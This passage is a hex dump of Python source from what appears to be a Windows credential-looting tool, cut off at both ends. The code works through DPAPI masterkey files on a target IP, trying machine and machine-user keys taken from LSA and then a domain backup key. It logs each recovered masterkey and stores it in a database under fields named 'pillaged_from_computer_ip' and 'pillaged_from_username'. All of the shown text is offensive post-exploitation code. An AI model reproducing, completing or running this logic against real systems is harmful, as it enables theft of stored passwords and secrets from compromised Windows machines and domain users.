+00015bc0: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
+00015bd0: 6c65 5b67 7569 645d 5b27 7374 6174 7573  le[guid]['status
+00015be0: 275d 203d 2027 6465 6372 7970 7465 6427  '] = 'decrypted'
+00015bf0: 0a09 0909 0909 0909 7573 6572 2e6d 6173  ........user.mas
+00015c00: 7465 726b 6579 735f 6669 6c65 5b67 7569  terkeys_file[gui
+00015c10: 645d 5b27 6b65 7927 5d20 3d20 6465 6372  d]['key'] = decr
+00015c20: 7970 7465 645f 6d61 7374 6572 6b65 790a  ypted_masterkey.
+00015c30: 0909 0909 0909 0923 2075 7365 722e 6d61  .......# user.ma
+00015c40: 7374 6572 6b65 7973 5b6c 6f63 616c 6669  sterkeys[localfi
+00015c50: 6c65 5d20 3d20 6465 6372 7970 7465 645f  le] = decrypted_
+00015c60: 6d61 7374 6572 6b65 790a 0909 0909 0909  masterkey.......
+00015c70: 0975 7365 722e 7479 7065 203d 2027 4d41  .user.type = 'MA
+00015c80: 4348 494e 4527 0a09 0909 0909 0909 7573  CHINE'........us
+00015c90: 6572 2e74 7970 655f 7661 6c69 6461 7465  er.type_validate
+00015ca0: 6420 3d20 5472 7565 0a09 0909 0909 0909  d = True........
+00015cb0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+00015cc0: 7567 280a 0909 0909 0909 0909 6622 5b7b  ug(.........f"[{
+00015cd0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00015ce0: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00015cf0: 732e 4f4b 424c 5545 7d44 6563 7279 7074  s.OKBLUE}Decrypt
+00015d00: 696f 6e20 7375 6363 6573 7366 756c 6c20  ion successfull 
+00015d10: 7b62 636f 6c6f 7273 2e45 4e44 437d 206f  {bcolors.ENDC} o
+00015d20: 6620 4d61 7374 6572 6b65 7920 7b67 7569  f Masterkey {gui
+00015d30: 647d 2066 6f72 204d 6163 6869 6e65 207b  d} for Machine {
+00015d40: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
+00015d50: 207b 7573 6572 2e75 7365 726e 616d 657d   {user.username}
+00015d60: 7b62 636f 6c6f 7273 2e45 4e44 437d 2020  {bcolors.ENDC}  
+00015d70: 5c6e 4b65 793a 207b 6465 6372 7970 7465  \nKey: {decrypte
+00015d80: 645f 6d61 7374 6572 6b65 797d 2229 0a09  d_masterkey}")..
+00015d90: 0909 0909 0909 7365 6c66 2e64 622e 7570  ......self.db.up
+00015da0: 6461 7465 5f6d 6173 7465 726b 6579 2866  date_masterkey(f
+00015db0: 696c 655f 7061 7468 3d75 7365 722e 6d61  ile_path=user.ma
+00015dc0: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
+00015dd0: 6964 5d5b 2770 6174 6827 5d2c 2067 7569  id]['path'], gui
+00015de0: 643d 6775 6964 2c0a 0909 0909 0909 0909  d=guid,.........
+00015df0: 0909 0909 0920 7374 6174 7573 3d75 7365  ..... status=use
+00015e00: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
+00015e10: 655b 6775 6964 5d5b 2773 7461 7475 7327  e[guid]['status'
+00015e20: 5d2c 0a09 0909 0909 0909 0909 0909 0909  ],..............
+00015e30: 2064 6563 7279 7074 6564 5f77 6974 683d   decrypted_with=
+00015e40: 224d 4143 4849 4e45 2d4b 4559 222c 2064  "MACHINE-KEY", d
+00015e50: 6563 7279 7074 6564 5f76 616c 7565 3d64  ecrypted_value=d
+00015e60: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
+00015e70: 6579 2c0a 0909 0909 0909 0909 0909 0909  ey,.............
+00015e80: 0920 7069 6c6c 6167 6564 5f66 726f 6d5f  . pillaged_from_
+00015e90: 636f 6d70 7574 6572 5f69 703d 7365 6c66  computer_ip=self
+00015ea0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+00015eb0: 6970 2c0a 0909 0909 0909 0909 0909 0909  ip,.............
+00015ec0: 0920 7069 6c6c 6167 6564 5f66 726f 6d5f  . pillaged_from_
+00015ed0: 7573 6572 6e61 6d65 3d75 7365 722e 7573  username=user.us
+00015ee0: 6572 6e61 6d65 290a 0909 0909 0909 0972  ername)........r
+00015ef0: 6574 7572 6e20 7573 6572 2e6d 6173 7465  eturn user.maste
+00015f00: 726b 6579 735f 6669 6c65 5b67 7569 645d  rkeys_file[guid]
+00015f10: 0a09 0909 0909 0965 6c73 653a 0a09 0909  .......else:....
+00015f20: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+00015f30: 2e64 6562 7567 280a 0909 0909 0909 0909  .debug(.........
+00015f40: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
+00015f50: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
+00015f60: 6f6c 6f72 732e 5741 524e 494e 477d 204d  olors.WARNING} M
+00015f70: 4143 4849 4e45 2d4b 6579 2066 726f 6d20  ACHINE-Key from 
+00015f80: 4c53 4120 7b6b 6579 2e64 6563 6f64 6528  LSA {key.decode(
+00015f90: 2775 7466 2d38 2729 7d20 6361 6e27 7420  'utf-8')} can't 
+00015fa0: 6465 636f 6465 207b 6263 6f6c 6f72 732e  decode {bcolors.
+00015fb0: 4f4b 424c 5545 7d7b 7573 6572 2e75 7365  OKBLUE}{user.use
+00015fc0: 726e 616d 657d 7b62 636f 6c6f 7273 2e45  rname}{bcolors.E
+00015fd0: 4e44 437d 204d 6173 7465 726b 6579 207b  NDC} Masterkey {
+00015fe0: 6775 6964 7d7b 6263 6f6c 6f72 732e 454e  guid}{bcolors.EN
+00015ff0: 4443 7d22 290a 0909 0909 0965 7863 6570  DC}")......excep
+00016000: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+00016010: 783a 0a09 0909 0909 0973 656c 662e 6c6f  x:.......self.lo
+00016020: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+00016030: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00016040: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00016050: 2045 7863 6570 7469 6f6e 207b 6263 6f6c   Exception {bcol
+00016060: 6f72 732e 5741 524e 494e 477d 204d 4143  ors.WARNING} MAC
+00016070: 4849 4e45 2d4b 6579 2066 726f 6d20 4c53  HINE-Key from LS
+00016080: 4120 7b6b 6579 2e64 6563 6f64 6528 2775  A {key.decode('u
+00016090: 7466 2d38 2729 7d20 6361 6e27 7420 6465  tf-8')} can't de
+000160a0: 636f 6465 207b 6263 6f6c 6f72 732e 4f4b  code {bcolors.OK
+000160b0: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
+000160c0: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
+000160d0: 437d 204d 6173 7465 726b 6579 207b 6775  C} Masterkey {gu
+000160e0: 6964 7d7b 6263 6f6c 6f72 732e 454e 4443  id}{bcolors.ENDC
+000160f0: 7d22 290a 0909 0909 0909 7365 6c66 2e6c  }").......self.l
+00016100: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
+00016110: 0a09 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
+00016120: 2320 6966 2075 7365 722e 7479 7065 5f76  # if user.type_v
+00016130: 616c 6964 6174 6564 203d 3d20 4661 6c73  alidated == Fals
+00016140: 653a 0a09 0909 0909 7465 7374 6564 5f74  e:......tested_t
+00016150: 7970 652e 6170 7065 6e64 2827 4d41 4348  ype.append('MACH
+00016160: 494e 4527 290a 0909 0909 0973 656c 662e  INE')......self.
+00016170: 6465 6372 7970 745f 6d61 7374 6572 6b65  decrypt_masterke
+00016180: 7928 7573 6572 2c20 6775 6964 2c20 7479  y(user, guid, ty
+00016190: 7065 3d27 4d41 4348 494e 452d 5553 4552  pe='MACHINE-USER
+000161a0: 272c 2074 6573 7465 645f 7479 7065 3d74  ', tested_type=t
+000161b0: 6573 7465 645f 7479 7065 290a 0909 0965  ested_type)....e
+000161c0: 6c69 6620 7479 7065 203d 3d20 274d 4143  lif type == 'MAC
+000161d0: 4849 4e45 2d55 5345 5227 3a0a 0909 0909  HINE-USER':.....
+000161e0: 2320 5472 7920 6465 2064 6563 7279 7074  # Try de decrypt
+000161f0: 206d 6173 7465 726b 6579 2066 696c 650a   masterkey file.
+00016200: 0909 0909 666f 7220 6b65 7920 696e 2073  ....for key in s
+00016210: 656c 662e 7573 6572 5f6b 6579 3a0a 0909  elf.user_key:...
+00016220: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00016230: 6465 6275 6728 0a09 0909 0909 0966 225b  debug(.......f"[
+00016240: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00016250: 7267 6574 5f69 707d 5d20 5b2e 2e2e 5d20  rget_ip}] [...] 
+00016260: 4465 6372 7970 7469 6e67 207b 6263 6f6c  Decrypting {bcol
+00016270: 6f72 732e 4f4b 424c 5545 7d7b 7573 6572  ors.OKBLUE}{user
+00016280: 2e75 7365 726e 616d 657d 7b62 636f 6c6f  .username}{bcolo
+00016290: 7273 2e45 4e44 437d 206d 6173 7465 726b  rs.ENDC} masterk
+000162a0: 6579 207b 6775 6964 7d20 7769 7468 204d  ey {guid} with M
+000162b0: 4143 4849 4e45 2d55 5345 525f 4b65 7920  ACHINE-USER_Key 
+000162c0: 6672 6f6d 204c 5341 207b 6b65 792e 6465  from LSA {key.de
+000162d0: 636f 6465 2827 7574 662d 3827 297d 2229  code('utf-8')}")
+000162e0: 2020 2320 616e 6420 5349 4420 2573 202c    # and SID %s ,
+000162f0: 2075 7365 722e 7369 6420 2929 0a09 0909   user.sid ))....
+00016300: 0909 7472 793a 0a09 0909 0909 0923 206b  ..try:.......# k
+00016310: 6579 312c 206b 6579 3220 3d20 6465 7269  ey1, key2 = deri
+00016320: 7665 4b65 7973 4672 6f6d 5573 6572 6b65  veKeysFromUserke
+00016330: 7928 7473 6964 2c20 7573 6572 6b65 7929  y(tsid, userkey)
+00016340: 0a09 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
+00016350: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
+00016360: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
+00016370: 0909 0909 096d 796f 7074 696f 6e73 2e66  .....myoptions.f
+00016380: 696c 6520 3d20 6c6f 6361 6c66 696c 6520  ile = localfile 
+00016390: 2023 204d 6173 7465 726b 6579 6669 6c65   # Masterkeyfile
+000163a0: 2074 6f20 7061 7273 650a 0909 0909 0909   to parse.......
+000163b0: 6966 2075 7365 722e 6973 5f61 6463 6f6e  if user.is_adcon
+000163c0: 6e65 6374 2069 7320 5472 7565 3a0a 0909  nect is True:...
+000163d0: 0909 0909 096d 796f 7074 696f 6e73 2e6b  .....myoptions.k
+000163e0: 6579 203d 206b 6579 2e64 6563 6f64 6528  ey = key.decode(
+000163f0: 2275 7466 2d38 2229 0a09 0909 0909 0909  "utf-8")........
+00016400: 6d79 6f70 7469 6f6e 732e 7369 6420 3d20  myoptions.sid = 
+00016410: 7573 6572 2e73 6964 0a09 0909 0909 0965  user.sid.......e
+00016420: 6c73 653a 0a09 0909 0909 0909 6d79 6f70  lse:........myop
+00016430: 7469 6f6e 732e 6b65 7920 3d20 6b65 792e  tions.key = key.
+00016440: 6465 636f 6465 2822 7574 662d 3822 2920  decode("utf-8") 
+00016450: 2023 204e 6f6e 650a 0909 0909 0909 096d   # None........m
+00016460: 796f 7074 696f 6e73 2e73 6964 203d 204e  yoptions.sid = N
+00016470: 6f6e 6520 2023 2075 7365 722e 7369 640a  one  # user.sid.
+00016480: 0a09 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
+00016490: 2e75 7365 726e 616d 6520 3d20 7573 6572  .username = user
+000164a0: 2e75 7365 726e 616d 650a 0909 0909 0909  .username.......
+000164b0: 6d79 6f70 7469 6f6e 732e 7076 6b20 3d20  myoptions.pvk = 
+000164c0: 4e6f 6e65 0a09 0909 0909 096d 7964 7061  None.......mydpa
+000164d0: 7069 203d 2044 5041 5049 286d 796f 7074  pi = DPAPI(myopt
+000164e0: 696f 6e73 2c20 7365 6c66 2e6c 6f67 6769  ions, self.loggi
+000164f0: 6e67 290a 0909 0909 0909 6465 6372 7970  ng).......decryp
+00016500: 7465 645f 6d61 7374 6572 6b65 7920 3d20  ted_masterkey = 
+00016510: 6d79 6470 6170 692e 6465 6372 7970 745f  mydpapi.decrypt_
+00016520: 6d61 7374 6572 6b65 7928 290a 0909 0909  masterkey().....
+00016530: 0909 6966 2064 6563 7279 7074 6564 5f6d  ..if decrypted_m
+00016540: 6173 7465 726b 6579 2021 3d20 2d31 2061  asterkey != -1 a
+00016550: 6e64 2064 6563 7279 7074 6564 5f6d 6173  nd decrypted_mas
+00016560: 7465 726b 6579 2021 3d20 4e6f 6e65 3a0a  terkey != None:.
+00016570: 0909 0909 0909 0923 2073 656c 662e 6c6f  .......# self.lo
+00016580: 6767 696e 672e 6465 6275 6728 6622 5b7b  gging.debug(f"[{
+00016590: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+000165a0: 6765 745f 6970 7d5d 2044 6563 7279 7074  get_ip}] Decrypt
+000165b0: 696f 6e20 7375 6363 6573 7366 756c 6c20  ion successfull 
+000165c0: 7b62 636f 6c6f 7273 2e45 4e44 437d 3a20  {bcolors.ENDC}: 
+000165d0: 7b64 6563 7279 7074 6564 5f6d 6173 7465  {decrypted_maste
+000165e0: 726b 6579 7d22 290a 0909 0909 0909 0975  rkey}")........u
+000165f0: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
+00016600: 696c 655b 6775 6964 5d5b 2773 7461 7475  ile[guid]['statu
+00016610: 7327 5d20 3d20 2764 6563 7279 7074 6564  s'] = 'decrypted
+00016620: 270a 0909 0909 0909 0975 7365 722e 6d61  '........user.ma
+00016630: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
+00016640: 6964 5d5b 276b 6579 275d 203d 2064 6563  id]['key'] = dec
+00016650: 7279 7074 6564 5f6d 6173 7465 726b 6579  rypted_masterkey
+00016660: 0a09 0909 0909 0909 2320 7573 6572 2e6d  ........# user.m
+00016670: 6173 7465 726b 6579 735b 6c6f 6361 6c66  asterkeys[localf
+00016680: 696c 655d 203d 2064 6563 7279 7074 6564  ile] = decrypted
+00016690: 5f6d 6173 7465 726b 6579 0a09 0909 0909  _masterkey......
+000166a0: 0909 7573 6572 2e74 7970 6520 3d20 274d  ..user.type = 'M
+000166b0: 4143 4849 4e45 2d55 5345 5227 0a09 0909  ACHINE-USER'....
+000166c0: 0909 0909 7573 6572 2e74 7970 655f 7661  ....user.type_va
+000166d0: 6c69 6461 7465 6420 3d20 5472 7565 0a09  lidated = True..
+000166e0: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+000166f0: 6e67 2e64 6562 7567 280a 0909 0909 0909  ng.debug(.......
+00016700: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+00016710: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+00016720: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d44  bcolors.OKBLUE}D
+00016730: 6563 7279 7074 696f 6e20 7375 6363 6573  ecryption succes
+00016740: 7366 756c 6c20 7b62 636f 6c6f 7273 2e45  sfull {bcolors.E
+00016750: 4e44 437d 206f 6620 4d61 7374 6572 6b65  NDC} of Masterke
+00016760: 7920 7b67 7569 647d 2066 6f72 204d 6163  y {guid} for Mac
+00016770: 6869 6e65 207b 6263 6f6c 6f72 732e 4f4b  hine {bcolors.OK
+00016780: 4752 4545 4e7d 207b 7573 6572 2e75 7365  GREEN} {user.use
+00016790: 726e 616d 657d 7b62 636f 6c6f 7273 2e45  rname}{bcolors.E
+000167a0: 4e44 437d 2020 5c6e 4b65 793a 207b 6465  NDC}  \nKey: {de
+000167b0: 6372 7970 7465 645f 6d61 7374 6572 6b65  crypted_masterke
+000167c0: 797d 2229 0a09 0909 0909 0909 7365 6c66  y}")........self
+000167d0: 2e64 622e 7570 6461 7465 5f6d 6173 7465  .db.update_maste
+000167e0: 726b 6579 2866 696c 655f 7061 7468 3d75  rkey(file_path=u
+000167f0: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
+00016800: 696c 655b 6775 6964 5d5b 2770 6174 6827  ile[guid]['path'
+00016810: 5d2c 2067 7569 643d 6775 6964 2c0a 0909  ], guid=guid,...
+00016820: 0909 0909 0909 0909 0909 0920 7374 6174  ........... stat
+00016830: 7573 3d75 7365 722e 6d61 7374 6572 6b65  us=user.masterke
+00016840: 7973 5f66 696c 655b 6775 6964 5d5b 2773  ys_file[guid]['s
+00016850: 7461 7475 7327 5d2c 0a09 0909 0909 0909  tatus'],........
+00016860: 0909 0909 0909 2064 6563 7279 7074 6564  ...... decrypted
+00016870: 5f77 6974 683d 224d 4143 4849 4e45 2d55  _with="MACHINE-U
+00016880: 5345 5222 2c20 6465 6372 7970 7465 645f  SER", decrypted_
+00016890: 7661 6c75 653d 6465 6372 7970 7465 645f  value=decrypted_
+000168a0: 6d61 7374 6572 6b65 792c 0a09 0909 0909  masterkey,......
+000168b0: 0909 0909 0909 0909 2070 696c 6c61 6765  ........ pillage
+000168c0: 645f 6672 6f6d 5f63 6f6d 7075 7465 725f  d_from_computer_
+000168d0: 6970 3d73 656c 662e 6f70 7469 6f6e 732e  ip=self.options.
+000168e0: 7461 7267 6574 5f69 702c 0a09 0909 0909  target_ip,......
+000168f0: 0909 0909 0909 0909 2070 696c 6c61 6765  ........ pillage
+00016900: 645f 6672 6f6d 5f75 7365 726e 616d 653d  d_from_username=
+00016910: 7573 6572 2e75 7365 726e 616d 6529 0a09  user.username)..
+00016920: 0909 0909 0909 7265 7475 726e 2075 7365  ......return use
+00016930: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
+00016940: 655b 6775 6964 5d0a 0909 0909 0909 656c  e[guid].......el
+00016950: 7365 3a0a 0909 0909 0909 0973 656c 662e  se:........self.
+00016960: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+00016970: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+00016980: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00016990: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
+000169a0: 4e49 4e47 7d20 4d41 4348 494e 452d 5553  NING} MACHINE-US
+000169b0: 4552 5f4b 6579 2066 726f 6d20 4c53 4120  ER_Key from LSA 
+000169c0: 7b6b 6579 2e64 6563 6f64 6528 2775 7466  {key.decode('utf
+000169d0: 2d38 2729 7d20 6361 6e27 7420 6465 636f  -8')} can't deco
+000169e0: 6465 207b 6263 6f6c 6f72 732e 4f4b 424c  de {bcolors.OKBL
+000169f0: 5545 7d7b 7573 6572 2e75 7365 726e 616d  UE}{user.usernam
+00016a00: 657d 7b62 636f 6c6f 7273 2e57 4152 4e49  e}{bcolors.WARNI
+00016a10: 4e47 7d20 204d 6173 7465 726b 6579 207b  NG}  Masterkey {
+00016a20: 6775 6964 7d7b 6263 6f6c 6f72 732e 454e  guid}{bcolors.EN
+00016a30: 4443 7d22 290a 0909 0909 0965 7863 6570  DC}")......excep
+00016a40: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+00016a50: 783a 0a09 0909 0909 0973 656c 662e 6c6f  x:.......self.lo
+00016a60: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+00016a70: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00016a80: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00016a90: 2045 7863 6570 7469 6f6e 207b 6263 6f6c   Exception {bcol
+00016aa0: 6f72 732e 5741 524e 494e 477d 204d 4143  ors.WARNING} MAC
+00016ab0: 4849 4e45 2d55 5345 525f 4b65 7920 6672  HINE-USER_Key fr
+00016ac0: 6f6d 204c 5341 207b 6b65 792e 6465 636f  om LSA {key.deco
+00016ad0: 6465 2827 7574 662d 3827 297d 2063 616e  de('utf-8')} can
+00016ae0: 2774 2064 6563 6f64 6520 7b62 636f 6c6f  't decode {bcolo
+00016af0: 7273 2e4f 4b42 4c55 457d 7b75 7365 722e  rs.OKBLUE}{user.
+00016b00: 7573 6572 6e61 6d65 7d7b 6263 6f6c 6f72  username}{bcolor
+00016b10: 732e 5741 524e 494e 477d 2020 4d61 7374  s.WARNING}  Mast
+00016b20: 6572 6b65 7920 7b67 7569 647d 7b62 636f  erkey {guid}{bco
+00016b30: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+00016b40: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00016b50: 6465 6275 6728 6578 290a 0909 0909 656c  debug(ex).....el
+00016b60: 7365 3a0a 0909 0909 0974 6573 7465 645f  se:......tested_
+00016b70: 7479 7065 2e61 7070 656e 6428 274d 4143  type.append('MAC
+00016b80: 4849 4e45 2d55 5345 5227 290a 0909 0909  HINE-USER').....
+00016b90: 0969 6620 7573 6572 2e74 7970 655f 7661  .if user.type_va
+00016ba0: 6c69 6461 7465 6420 3d3d 2046 616c 7365  lidated == False
+00016bb0: 2061 6e64 206e 6f74 2075 7365 722e 6973   and not user.is
+00016bc0: 5f61 6463 6f6e 6e65 6374 3a0a 0909 0909  _adconnect:.....
+00016bd0: 0909 7265 7475 726e 2073 656c 662e 6465  ..return self.de
+00016be0: 6372 7970 745f 6d61 7374 6572 6b65 7928  crypt_masterkey(
+00016bf0: 7573 6572 2c20 6775 6964 2c20 7479 7065  user, guid, type
+00016c00: 3d27 444f 4d41 494e 272c 2074 6573 7465  ='DOMAIN', teste
+00016c10: 645f 7479 7065 3d74 6573 7465 645f 7479  d_type=tested_ty
+00016c20: 7065 290a 0909 0909 0969 6620 2744 4f4d  pe)......if 'DOM
+00016c30: 4149 4e27 206e 6f74 2069 6e20 7465 7374  AIN' not in test
+00016c40: 6564 5f74 7970 653a 0a09 0909 0909 0972  ed_type:.......r
+00016c50: 6574 7572 6e20 7365 6c66 2e64 6563 7279  eturn self.decry
+00016c60: 7074 5f6d 6173 7465 726b 6579 2875 7365  pt_masterkey(use
+00016c70: 722c 2067 7569 642c 2074 7970 653d 2744  r, guid, type='D
+00016c80: 4f4d 4149 4e27 2c20 7465 7374 6564 5f74  OMAIN', tested_t
+00016c90: 7970 653d 7465 7374 6564 5f74 7970 6529  ype=tested_type)
+00016ca0: 0a0a 0909 0965 6c69 6620 7479 7065 203d  .....elif type =
+00016cb0: 3d20 2744 4f4d 4149 4e27 2061 6e64 2073  = 'DOMAIN' and s
+00016cc0: 656c 662e 6f70 7469 6f6e 732e 7076 6b20  elf.options.pvk 
+00016cd0: 6973 206e 6f74 204e 6f6e 653a 0a09 0909  is not None:....
+00016ce0: 0923 2046 6f72 2041 4443 6f6e 6e65 6374  .# For ADConnect
+00016cf0: 0a09 0909 0969 6620 7573 6572 2e69 735f  .....if user.is_
+00016d00: 6164 636f 6e6e 6563 7420 6973 2054 7275  adconnect is Tru
+00016d10: 6520 616e 6420 274d 4143 4849 4e45 2d55  e and 'MACHINE-U
+00016d20: 5345 5227 206e 6f74 2069 6e20 7465 7374  SER' not in test
+00016d30: 6564 5f74 7970 653a 0a09 0909 0909 7265  ed_type:......re
+00016d40: 7475 726e 2073 656c 662e 6465 6372 7970  turn self.decryp
+00016d50: 745f 6d61 7374 6572 6b65 7928 7573 6572  t_masterkey(user
+00016d60: 2c20 6775 6964 2c20 7479 7065 3d27 4d41  , guid, type='MA
+00016d70: 4348 494e 452d 5553 4552 272c 2074 6573  CHINE-USER', tes
+00016d80: 7465 645f 7479 7065 3d74 6573 7465 645f  ted_type=tested_
+00016d90: 7479 7065 290a 0909 0909 2320 5472 7920  type).....# Try 
+00016da0: 6465 2064 6563 7279 7074 206d 6173 7465  de decrypt maste
+00016db0: 726b 6579 2066 696c 650a 0909 0909 7365  rkey file.....se
+00016dc0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00016dd0: 280a 0909 0909 0966 225b 7b73 656c 662e  (......f"[{self.
+00016de0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00016df0: 707d 5d20 5b2e 2e2e 5d20 4465 6372 7970  p}] [...] Decryp
+00016e00: 7469 6e67 207b 6263 6f6c 6f72 732e 4f4b  ting {bcolors.OK
+00016e10: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
+00016e20: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
+00016e30: 437d 206d 6173 7465 726b 6579 207b 6775  C} masterkey {gu
+00016e40: 6964 7d20 7769 7468 2044 6f6d 6169 6e20  id} with Domain 
+00016e50: 4261 636b 7570 6b65 7920 7b73 656c 662e  Backupkey {self.
+00016e60: 6f70 7469 6f6e 732e 7076 6b7d 2229 0a09  options.pvk}")..
+00016e70: 0909 0974 7279 3a0a 0909 0909 096d 796f  ...try:......myo
+00016e80: 7074 696f 6e73 203d 2063 6f70 792e 6465  ptions = copy.de
+00016e90: 6570 636f 7079 2873 656c 662e 6f70 7469  epcopy(self.opti
+00016ea0: 6f6e 7329 0a09 0909 0909 6d79 6f70 7469  ons)......myopti
+00016eb0: 6f6e 732e 6669 6c65 203d 206c 6f63 616c  ons.file = local
+00016ec0: 6669 6c65 2020 2320 4d61 7374 6572 6b65  file  # Masterke
+00016ed0: 7966 696c 6520 746f 2070 6172 7365 0a09  yfile to parse..
+00016ee0: 0909 0909 6d79 6f70 7469 6f6e 732e 7573  ....myoptions.us
+00016ef0: 6572 6e61 6d65 203d 2075 7365 722e 7573  ername = user.us
+00016f00: 6572 6e61 6d65 0a09 0909 0909 6d79 6f70  ername......myop
+00016f10: 7469 6f6e 732e 7369 6420 3d20 7573 6572  tions.sid = user
+00016f20: 2e73 6964 0a09 0909 0909 6d79 6470 6170  .sid......mydpap
+00016f30: 6920 3d20 4450 4150 4928 6d79 6f70 7469  i = DPAPI(myopti
+00016f40: 6f6e 732c 2073 656c 662e 6c6f 6767 696e  ons, self.loggin
+00016f50: 6729 0a09 0909 0909 6465 6372 7970 7465  g)......decrypte
+00016f60: 645f 6d61 7374 6572 6b65 7920 3d20 6d79  d_masterkey = my
+00016f70: 6470 6170 692e 6465 6372 7970 745f 6d61  dpapi.decrypt_ma
+00016f80: 7374 6572 6b65 7928 290a 0909 0909 0969  sterkey()......i
+00016f90: 6620 6465 6372 7970 7465 645f 6d61 7374  f decrypted_mast
+00016fa0: 6572 6b65 7920 213d 202d 3120 616e 6420  erkey != -1 and 
+00016fb0: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
+00016fc0: 6b65 7920 213d 204e 6f6e 653a 0a09 0909  key != None:....
+00016fd0: 0909 0923 2073 656c 662e 6c6f 6767 696e  ...# self.loggin
+00016fe0: 672e 6465 6275 6728 6622 5b7b 7365 6c66  g.debug(f"[{self
+00016ff0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+00017000: 6970 7d5d 207b 6263 6f6c 6f72 732e 4f4b  ip}] {bcolors.OK
+00017010: 4752 4545 4e7d 4465 6372 7970 7469 6f6e  GREEN}Decryption
+00017020: 2073 7563 6365 7373 6675 6c6c 207b 6263   successfull {bc
+00017030: 6f6c 6f72 732e 454e 4443 7d3a 2025 7322  olors.ENDC}: %s"
+00017040: 2025 2064 6563 7279 7074 6564 5f6d 6173   % decrypted_mas
+00017050: 7465 726b 6579 290a 0909 0909 0909 7573  terkey).......us
+00017060: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
+00017070: 6c65 5b67 7569 645d 5b27 7374 6174 7573  le[guid]['status
+00017080: 275d 203d 2027 6465 6372 7970 7465 6427  '] = 'decrypted'
+00017090: 0a09 0909 0909 0975 7365 722e 6d61 7374  .......user.mast
+000170a0: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
+000170b0: 5d5b 276b 6579 275d 203d 2064 6563 7279  ]['key'] = decry
+000170c0: 7074 6564 5f6d 6173 7465 726b 6579 0a09  pted_masterkey..
+000170d0: 0909 0909 0923 2075 7365 722e 6d61 7374  .....# user.mast
+000170e0: 6572 6b65 7973 5b6c 6f63 616c 6669 6c65  erkeys[localfile
+000170f0: 5d20 3d20 6465 6372 7970 7465 645f 6d61  ] = decrypted_ma
+00017100: 7374 6572 6b65 790a 0909 0909 0909 7573  sterkey.......us
+00017110: 6572 2e74 7970 6520 3d20 2744 4f4d 4149  er.type = 'DOMAI
+00017120: 4e27 0a09 0909 0909 0975 7365 722e 7479  N'.......user.ty
+00017130: 7065 5f76 616c 6964 6174 6564 203d 2054  pe_validated = T
+00017140: 7275 650a 0909 0909 0909 7365 6c66 2e6c  rue.......self.l
+00017150: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
+00017160: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+00017170: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+00017180: 5d20 7b62 636f 6c6f 7273 2e4f 4b42 4c55  ] {bcolors.OKBLU
+00017190: 457d 4465 6372 7970 7469 6f6e 2073 7563  E}Decryption suc
+000171a0: 6365 7373 6675 6c6c 207b 6263 6f6c 6f72  cessfull {bcolor
